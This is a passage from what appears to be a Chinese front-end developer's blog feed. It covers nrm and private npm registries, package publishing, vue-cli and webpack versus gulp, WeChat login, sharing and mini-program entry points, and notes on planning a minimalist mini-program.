rel="noopener">http://r.cnpmjs.org/</a><br>taobao - <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org/</a><br>nj —– <a href="https://registry.nodejitsu.com/" target="_blank" rel="noopener">https://registry.nodejitsu.com/</a><br>npmMirror  <a href="https://skimdb.npmjs.com/registry/" target="_blank" rel="noopener">https://skimdb.npmjs.com/registry/</a><br>edunpm - <a href="http://registry.enpmjs.org/" target="_blank" rel="noopener">http://registry.enpmjs.org/</a></p><p>这样就可以方便的管理 npm 的源。</p><h4 id="npm私服"><a href="#npm私服" class="headerlink" title="npm私服"></a>npm私服</h4><p>如果公司内部搭建了私有的 npm，也使用 nrm 也可以更好切换和管理。</p><p>比如我有个 npm 私服</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nrm add eva http://registry.npm.evacoder.com/ </span><br><span class="line">npm use eva</span><br></pre></td></tr></table></figure><p>指定好源之后，还是用 npm 命令，而不用使用 cnpm 等命令。</p><p>私服不会全量同步 npm 包，有时候找不到时需要手动同步下 package。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://npm.evacoder.com/sync/[package] </span><br><span class="line"># 或者浏览器访问 http://npm.evacoder.com/sync/[package]</span><br></pre></td></tr></table></figure><h4 id="发布自己的-npm-package"><a href="#发布自己的-npm-package" class="headerlink" title="发布自己的 npm package"></a>发布自己的 npm package</h4><p>其实 npm package 就是一个自己写的 js export 出来而已。发布一个 package 只需要</p><p>1.写代码，2.注册 npm 帐号(私服就addUser)，3.发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册登录</span></span><br><span class="line">npm login</span><br><span class="line"><span class="comment"># 填写 username，password，email</span></span><br><span class="line"><span class="comment"># 新建项目</span></span><br><span class="line">npm init --yes</span><br></pre></td></tr></table></figure><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"@eva/hello-world"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">  <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="string">'hello Eva'</span>;</span><br></pre></td></tr></table></figure><p>发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发布</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"><span class="comment"># -S是保存到 package.json中</span></span><br><span class="line"><span class="comment"># -D 是指是 devDependency，只是工具，不会打包到代码中去的</span></span><br><span class="line">npm i -S -D @eva/hello-world</span><br><span class="line">node -e <span class="string">'console.log(require("@eva/hello-world"))'</span></span><br></pre></td></tr></table></figure><p>具体的 编写高质量npm package 的详细内容将在 sdk 编写心得中展开来说</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 基础设施 」前言</title>
      <link href="/2018/11/20/team_intro/"/>
      <url>/2018/11/20/team_intro/</url>
      
        <content type="html"><![CDATA[<p>这个系列是开始思考如何组建一个好的前端团队，虽然团队现在只有我一个人，但是一个人也要像一支队伍！<br>等以后有别的小伙伴加入了，直接看这个系列就可以了，文档大法拯救世界。<br>没错，我就是这样的懒东西~写好文档都是为了更好的偷懒。<br><a id="more"></a></p><h4 id="新人必读"><a href="#新人必读" class="headerlink" title="新人必读"></a>新人必读</h4><p>因公司而异，介绍入职后环境搭建，基础设施。</p><h4 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h4><p>暂时使用eslint-airbnb</p><h4 id="每周分享"><a href="#每周分享" class="headerlink" title="每周分享"></a>每周分享</h4><p>如果做不到每周现场分享会的话，至少也要做到轮值发布前端周刊，比如<a href="https://github.com/MIFE/frontend-weekly" target="_blank" rel="noopener">这样</a><br>思考下你每周分享的话能分享什么东西，你就会发现学习和不学习的人的差别实在太大了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> team </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从vue-cli说到webpack浪漫史</title>
      <link href="/2018/11/18/vue-cli/"/>
      <url>/2018/11/18/vue-cli/</url>
      
        <content type="html"><![CDATA[<p>（啊！这篇文章写了快两个月了，涉及的东西太多了，逃~）</p><h4 id="安利"><a href="#安利" class="headerlink" title="安利"></a>安利</h4><p>虽然现在已经是19年了，还不懂webpack，es6吗？可能每次的借口就是，没有实践的机会。</p><p>那么现在的我真的建议你，<strong>使用element-ui开始写你下一个后台管理系统吧</strong>。</p><p>但是一定要谨记一个开发的原则：<strong>不拿外部有影响力的项目来练手，而是先在内部系统中进行有趣的尝试，成熟踩坑之后再用在外部项目中</strong>。</p><p>这篇文章可能没那么高大上，如果你对webpack已经烂熟于心，也可以看着玩玩，权当回顾webpack的历史，也可以帮我指出些问题。<br><a id="more"></a></p><p>element-ui有多好用呢？其实还是搞安全的后端同学推荐给我的，你就能知道，完全不懂前端的人都能玩转。</p><p>如果在看这篇文章的你是一个不懂前端的后端同学，也可以试试这个框架，以后开发后台管理系统不用再求人啦。</p><p>element-ui 有完善的 <a href="http://element-cn.eleme.io/#/zh-CN/component/installation" target="_blank" rel="noopener">api文档</a>，比bootstrap复制粘贴起来还畅快，而且使用 <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">vue-element-admin</a> 更是分分钟能搭建一个后台管理系统。</p><p>等你搭积木似的完成一个项目，以上那些新技术（vue，webpack，es6，nodeJS，npm）对你来说就不再陌生了（虽然不完全懂原理，但是至少算是碰过了）。</p><p>vue的好，在于它是一个<strong>渐进式</strong>的丰俭由人的框架，可以直接html里引入vue.js开箱即用写起来，也可以使用vue-cli提供的一整套开发流程。使用了vue-cli，我们就可以轻轻松松窥见<strong>现代的先进的前端开发项目</strong>是怎么样的。</p><p>这里是vue-cli的 <a href="https://cli.vuejs.org/guide/" target="_blank" rel="noopener">文档</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">npm i -g @vue/cli</span><br><span class="line"><span class="comment"># 新建项目</span></span><br><span class="line">vue create hello-world</span><br><span class="line"><span class="comment"># 选择默认的配置即可，安装好依赖之后，直接进入目录</span></span><br><span class="line"><span class="comment"># dev模式运行起项目</span></span><br><span class="line">npm run serve</span><br><span class="line"><span class="comment"># 打包项目发布</span></span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure><h4 id="vue-cli做了什么？"><a href="#vue-cli做了什么？" class="headerlink" title="vue-cli做了什么？"></a>vue-cli做了什么？</h4><p>what，因为拖得太久，vue-cli现在都升级成3.0的@vue/cli把build文件直接去掉了，这篇文章就是为了介绍vue-cli的打包配置的，以后都看不到webpack的打包配置源代码了，这怎么学习哦。</p><p>先抛开 vue 不谈，我们先思考一下最简单的完整前端项目可能会有哪些工程化方面需求。</p><h5 id="js-方面："><a href="#js-方面：" class="headerlink" title="js 方面："></a>js 方面：</h5><p>1.eslint 代码规范，不以规矩不成方圆。</p><p>2.通过 babel 将ES6+转为大多数浏览器可识别的ES5。</p><p>3.文件拼接，如果是 ES5写的可能需要将多个js文件concat起来，外面套个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// here is the content</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>来通过IIFE自执行匿名函数来隔离作用域。</p><p>如果是 ES6+写的，babel 转码也转不了<code>import &#39;a.js&#39;</code>，后面再说怎么办。</p><p>4.js 压缩，为了性能优化，加快加载时间，节省用户流量。</p><h5 id="css-方面："><a href="#css-方面：" class="headerlink" title="css 方面："></a>css 方面：</h5><p>1.scss/less 转为 css。</p><p>2.自动处理浏览器兼容性，加前缀，autoprefixer。</p><p>3.压缩 css</p><p>这些需求并不过分吧，都是很常见的。</p><p>其实vue-cli的webpack配置也主要实现了以下功能：</p><p>1.使用vue-loader将vue文件转为js文件</p><p>2.使用babel-loader将es6转es5</p><p>3.帮忙本地起一个node server来运行代码</p><p>4.使用eslint来规范我们的代码</p><p>5.hot module replacement(HMR)可以做到在应用运行时无需刷新页面即可替换模块来热更新。简言之，每次写完代码按ctrl+s不用手动刷新，浏览器自动就更新了。</p><p>6.production环境和dev环境的切换</p><p>7.production环境帮忙压缩js，把用到的第三方库抽离出来生成vendor.js（动静分离，不常修改的抽离出来），为打包出来的js生成一个hash，用来防止缓存。</p><p>8.css-loader，style-loader，sass-loader，将scss/less等转成浏览器可解析的css，postcss-loader给 css 加前缀autoprefixer保证兼容性，</p><p>回顾一下你平常的前端项目，通过webpack的工程化配置，是不是把你想做的都帮你做好了。</p><p>封装的越来越简单，看不到实现细节，以后前端真的变成搬砖工种啦。</p><blockquote><p>关于修改，Evan You 是这么说的</p><p><a href="mailto:1.vue-cli@3.0" target="_blank" rel="noopener">1.vue-cli@3.0</a>修改的方向是逐步成为“config/script in a package”的模型</p><p>2.为避免使用户预先做一些不可逆的设置，</p><p>-我们将逐步移除browserify支持，webpack将只基于一个template</p><p>-在预设时就可以配置常见的（pwa/ts/ssr）设置</p><p>3.除了封装包，提供通过vue.config.js配置的可能</p><p>-为高级功能 如 env variables, css extraction API proxying提供了一个集中的入口</p><p>-如本地预设一样，提供了底层的webpack设置支持，可能是webpackchain</p></blockquote><h4 id="前端工程化历史"><a href="#前端工程化历史" class="headerlink" title="前端工程化历史"></a>前端工程化历史</h4><p>我们先忽略上文中的那些loaders，只看需求和目标，是不是每个前端项目总会有这些需求。</p><p>你可能觉得没啥了不起的，即使没有webpack，我们也有各种scss转css，压缩文件等需求，比如css加前缀保证浏览器兼容性，保存文件自动刷新浏览器，js文件拼接。</p><p>我们的项目现在还存在为了打包拼接文件写的<strong>shell</strong>脚本，再通过YUI Compress来压缩。</p><p>有些工程化需求也可以使用<strong>sublime插件</strong>来完成，比如：</p><p>1.保存文件自动刷新浏览器（livereload插件，需要配合chrome插件livereload来完成，监控ctrl+s就无脑刷新浏览器，或者其他配置）</p><p>2.css加前缀保证浏览器兼容性（autoprefixer插件）</p><p>3.scss转css（sass插件）</p><p>通过编辑器来工程化一点儿也不靠谱，你没办法要求每个人都和你安装一样的环境，一样的版本，完全不可控制。 </p><p>用shell脚本同样也一点儿都不cool，就不能有前端自己的构建工具吗？</p><p>后来<strong>grunt/gulp</strong>应运而生。</p><p>有了这些构建工具，这些构建任务都跟着代码项目走，写好gulpfile，每个人clone下来，只需<code>npm install</code>就可以保证环境一致，零碎的打包工作也可以精简成一句<code>gulp</code>即可完成。</p><p>其实也能满足我的大部分需求了，但是后来我觉得es6写的爽啊，想要使用es6来开发。</p><p>没有import/export还好说，这种难道还用gulp-concat吗？no，no，no，这个时候我们的webpack就闪亮登场了。</p><p><code>npm run build</code>，写好一次webpack.conf.js之后再也不用每次手动操作，也不需要自己想办法去写shell脚本。</p><p>最开始因为webpack的文档不太平易近人，而望而却步，但是通过阮老师的 <a href="https://github.com/ruanyf/webpack-demos" target="_blank" rel="noopener">webpack-demos</a> 很清晰的就能了解到webpack使用进阶，以及一些常用的plugins，非常推荐，有使用基础的同学大概使用十分钟就能看完。</p><h4 id="webpack和gulp的区别"><a href="#webpack和gulp的区别" class="headerlink" title="webpack和gulp的区别"></a>webpack和gulp的区别</h4><h4 id="项目定位"><a href="#项目定位" class="headerlink" title="项目定位"></a>项目定位</h4><p>本质上简言之，Gulp是构建工具，webpack是模块化解决方案。</p><p>Gulp自己的slogan是The streaming build system，定位是流式构建系统，写好一个个任务（concat，minify，rename等等），通过pipe语法可以自定义构建顺序。</p><p>Webpack的介绍是webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.</p><p>webpack的初衷是用来打包js（typescript，ES6等）成浏览器能识别的js，现在可以打包任何资源（css，images）。但是现在webpack有了更多的插件，也可以处理gulp中的大部分任务。</p><h4 id="使用现状"><a href="#使用现状" class="headerlink" title="使用现状"></a>使用现状</h4><p>现在两者都可以用于前端构建，github上webpack的stars更多一点。</p><p>因为大多数项目通过npm scripts + webpack，直接写好npm scripts，其他开发者不需要关心细节，只需要<code>npm run serve</code>就可以完成基本需求，如果无法满足还有其他自定义需求，你可以再叠加gulp来完成构建。</p><p>gulp是构建工具，和grunt是一个level，grunt的效率比较低，大部分被gulp给取代了。</p><p>webpack是模块化方案，和browserify是一个level。</p><p>场景实例</p><p>比如我需要将一些ES6写的单文件打包并压缩混淆成一个js</p><p>最开始使用gulp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'gulp-babel'</span>);</span><br><span class="line"><span class="keyword">const</span> concat = <span class="built_in">require</span>(<span class="string">'gulp-concat'</span>);</span><br><span class="line"><span class="keyword">const</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">const</span> pump = <span class="built_in">require</span>(<span class="string">'pump'</span>);</span><br><span class="line"><span class="keyword">const</span> rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, () =&gt; &#123;</span><br><span class="line">  pump([</span><br><span class="line">    gulp.src([<span class="string">'src/js/*.js'</span>]),</span><br><span class="line">    babel(&#123;</span><br><span class="line">      presets: [<span class="string">'@babel/env'</span>],</span><br><span class="line">    &#125;),</span><br><span class="line">    concat(<span class="string">'sdk.min.js'</span>),</span><br><span class="line">    gulp.dest(<span class="string">'dist'</span>),</span><br><span class="line">    rename(&#123; <span class="attr">suffix</span>: <span class="string">'.min'</span> &#125;),</span><br><span class="line">    uglify(&#123;</span><br><span class="line">      compress: &#123;</span><br><span class="line">        ie8: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      mangle: &#123;</span><br><span class="line">        ie8: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      output: &#123;</span><br><span class="line">        ie8: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;),</span><br><span class="line">    gulp.dest(<span class="string">'pack'</span>),</span><br><span class="line">  ]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当遇到ES6中的import时你会发现仅仅使用gulp无法解决我们的需求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &apos;a&apos;</span><br></pre></td></tr></table></figure><p>babel转码之后依然保留了上面的原文。</p><p>浏览器还是无法识别这样的语法，而且已经有了import的引入关系，我们不应该再使用gulp-concat这样简单粗暴的拼接方法了，因为ES6里都是文件作用域，并不需要使用IFFE这样的自执行匿名函数或者命名空间来保证作用域的互相影响。</p><p>这个时候webpack就可以很简单的满足我们的需求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'development'</span>,</span><br><span class="line">  entry: <span class="string">'./src/js/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">'pack/'</span>),</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [&#123;</span><br><span class="line">      test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">      exclude: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">      use: &#123;</span><br><span class="line">        loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          presets: [<span class="string">'@babel/preset-env'</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只需要简单一句的<code>webpack</code>就可以完成所有的打包构建。</p><p>而且gulp需要自己列出哪些文件被引用了，但是webpack会根据import来自动理清文件的依赖关系更符合实际需求。</p><p>所以说前端发展的实在是太快了，好多人喊着学不动了，但是架不住确实好用啊，一次配置，终生受益。</p><p>这篇文章已经很长了，webpack 的具体使用请参见下一篇，webpack 的使用优化。</p>]]></content>
      
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 微信开发 」手机浏览器唤起微信app登录的可行性</title>
      <link href="/2018/10/12/wechat_dev_app_login/"/>
      <url>/2018/10/12/wechat_dev_app_login/</url>
      
        <content type="html"><![CDATA[<p>微信的地位越来越高，隔不了多久就有大佬问，为什么你们的手机端H5没有微信登录的入口，压力很大呀。</p><p>可能是安全问题或者其他考虑，微信在网页端只提供了扫码登录的入口，即使在手机端集成了微信登录，用户点开也会很奇怪，这个码只有PC端的样式，看起来很奇怪，而且怎么用我的手机微信来扫这个手机浏览器这个码呢？而且即使可以扫码成功也无法登录成功，所以看了大部分的公司都选择在手机浏览器隐藏了微信登录的入口。</p><a id="more"></a><h4 id="jd唤起微信app登录"><a href="#jd唤起微信app登录" class="headerlink" title="jd唤起微信app登录"></a>jd唤起微信app登录</h4><p>但是细心的PM发现，京东居然有微信登录的入口，但是一般也只是在QQ浏览器或者系统浏览器中支持，可以直接打开手机上的微信app，但是在无痕模式或者其他的浏览器也无法成功。</p><p>前端无隐私，让我们来F12来看看他们是怎么做到的。</p><p><img src="/images/wap_wxlogin.png" alt=""></p><p>可以发现，京东的微信登录并没有什么特别的，也是各种302跳转最后到了 <a href="https://open.weixin.qq.com/sns/explorer_broker?appid=wx2f5d8f9715c59d10&amp;redirect_uri=https%3A%2F%2Fplogin.m.jd.com%2Fcgi-bin%2Fml%2Fwxcallback%3Flsid%3Dq9ibchzrnbivxypneji7r4sxusp24wrv&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=smr1qm3p&amp;connect_redirect=1的" target="_blank" rel="noopener">https://open.weixin.qq.com/sns/explorer_broker?appid=wx2f5d8f9715c59d10&amp;redirect_uri=https%3A%2F%2Fplogin.m.jd.com%2Fcgi-bin%2Fml%2Fwxcallback%3Flsid%3Dq9ibchzrnbivxypneji7r4sxusp24wrv&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=smr1qm3p&amp;connect_redirect=1 </a>这个页面。最重要的是这个是微信的域名，所以我们可以知道，这个跳转是微信主动触发的。</p><p>怪不得说京东是微信亲儿子嘛。让我们看看这个页面做了什么事。</p><p><img src="/images/wap_wxlogin2.png" alt="">前面都是一些环境的判断，而且这些都是微信方帮忙实现的。最重要的是<code>location.href = &#39;weixin://dl/business/?ticket=tb15388ef1a6e07db69a0d57a87345f93&#39;</code></p><p>前端是可以实现打开微信app的，但是如何打开微信中某个特定的页面就需要微信app来支持了，而微信为京东做了特殊的处理，可以做到直接打开微信的app中京东的微信授权页面。</p><p>所以如果我们的业务也需要实现这个功能，就需要向微信申请了。</p><p>后来沟通发现微信是有开放的H5唤起微信app登录功能的。</p><p>PC端需要使用web app的appid来进行扫码登录</p><p>H5端（手机浏览器，微信的webview）需要申请一个公众号来完成这个功能，只支持safari，QQ浏览器和UC浏览器。</p><p>另外一个更激进的就是QQ了，公告说是为了一些不安全因素，在18年年初完全下掉了wap端网页登录的方式，现在wap端的QQ登录都采用直接打开QQ app的方式来授权登录。在某些非系统浏览器中因为无法打开app就悲剧了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 产品 」极简小程序产品设计笔记</title>
      <link href="/2018/10/12/minimalism_product_design/"/>
      <url>/2018/10/12/minimalism_product_design/</url>
      
        <content type="html"><![CDATA[<p>最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的<a href="https://www.youzan.com" target="_blank" rel="noopener">有赞</a>的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。<br>这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了<strong>提高审美，学习成为一个设计师的基本技能</strong>，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。</p><a id="more"></a><h4 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h4><p>从六年前开始接触极简主义生活方式，如果你要让我说极简主义的好，我可以说三天三夜，哈哈，这里就不赘述，留到产品中去体现。<br>因为最近经济形势不好，消费降级突然变得流行起来，现在我的豆瓣timeline中有无数的人开始安利极简生活。</p><p>如果你要问我极简是什么？我会说极简是寻找生活的最优解，入了极简主义可以大概率保证你的人生一直走上坡路，我相信极简一定会贯穿我整个生命。<br>一直想自己做个什么项目，想着热爱整理的我，每天整理一百遍，把自己所有的物品都进行统计盘点，希望有个方便的进行物品盘点的小程序。</p><p>产品方面，18年学习了<a href="https://book.douban.com/subject/25915629/" target="_blank" rel="noopener">破茧成蝶：用户体验设计师的成长之路</a>，妥协的完美主义，绝密原型档案，<a href="https://book.douban.com/subject/4723970/" target="_blank" rel="noopener">人人都是产品经理</a>，得到上的梁宁产品30讲，希望可以全面实践下。</p><h4 id="项目总览"><a href="#项目总览" class="headerlink" title="项目总览"></a>项目总览</h4><p>在平常的工作中项目大概也会分为这三个部分。<br>1.管理后台<br>CRUD，主要是增删改查数据，权限控制等。<br>技术栈：<br>vue的element-ui，有现成的管理后端的模版 <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">vue-element-admin</a><br>node express+mongoose<br>2.小程序<br><a href="https://github.com/Meituan-Dianping/mpvue" target="_blank" rel="noopener">mpvue</a> 和 <a href="https://github.com/Tencent/wepy" target="_blank" rel="noopener">wepy</a> 各有优劣，wepy因为是官方支持，用的会比较多一点。<br><a href="https://github.com/aben1188/awesome-wepy" target="_blank" rel="noopener">awesome-wepy</a> 有很多小程序源码可以学习。<br><a href="https://github.com/dyq086/wepy-mall" target="_blank" rel="noopener">一个电商小程序的全功能源码</a><br>3.web页<br>暂定只是一个介绍页，以后可以加入其他的信息。<br>前后端分离响应式。</p><p>本文会持续更新产品进度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 产品 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 微信开发 」微信分享功能</title>
      <link href="/2018/09/28/wechat_dev_share/"/>
      <url>/2018/09/28/wechat_dev_share/</url>
      
        <content type="html"><![CDATA[<p>实践微信的分享功能<br><a id="more"></a><br>接入js-sdk的分享功能，分享出去的地址会变成</p><p><a href="https://i.mi.com/static2?filename=MicloudWebBill/event/recruit/index.html&amp;from=singlemessage&amp;isappinstalled=0" target="_blank" rel="noopener">https://i.mi.com/static2?filename=MicloudWebBill/event/recruit/index.html&amp;from=singlemessage&amp;isappinstalled=0</a></p><p>后台签名如果是写死url的话，第二次分享就会有签名错误的问题，分享出去用户看到的description和头图都没有了，变成了默认的url地址。</p><p>所以后端需要实时获取url地址来加密签名，以免导致二次分享出错的问题</p><p>一般给后端传入当前<code>location.href</code></p><p>建议查看<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115</a>中的<strong>附录5-常见错误及解决方法</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 微信开发 」小程序的入口</title>
      <link href="/2018/09/22/wechat_dev_miniprogram_entrance/"/>
      <url>/2018/09/22/wechat_dev_miniprogram_entrance/</url>
      
        <content type="html"><![CDATA[<p>用户在使用微信时，打开小程序的体验要比打开H5页面的体验要好得多，老板希望在H5页面可以直接打开小程序。</p><p>查阅资料发现，至目前为止，现在H5和小程序互相跳转的唯二方式如下：<br><a id="more"></a></p><p>1.可以在H5的页面中放一个小程序的二维码，用户<strong>长按识别</strong>小程序二维码就可以跳转到小程序中</p><p>2.或者把H5页面嵌入到小程序的web-view中，在H5页面中通过调用JS-SDK的<code>wx.navigateToMiniProgram</code>跳转到小程序的native页面中。注意此时行为都发生在小程序中，H5的域名需要在小程序的域名校验名单中。</p><p>除了以上入口，还有：</p><p>1.用户在小程序中点分享给朋友，还可以把小程序发在消息中。</p><p>2.在公众号文章中可以直接打开小程序。</p><p>但是非小程序内嵌的H5是不能直接打开小程序的。</p><p>参考文档：</p><p><a href="https://developers.weixin.qq.com/miniprogram/dev/component/web-view.html" target="_blank" rel="noopener">微信的web-view API</a></p><p><a href="https://www.jianshu.com/p/50657f9af5b4" target="_blank" rel="noopener">小程序内嵌网页的方法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 微信开发 」前言</title>
      <link href="/2018/09/18/wechat_dev_intro/"/>
      <url>/2018/09/18/wechat_dev_intro/</url>
      
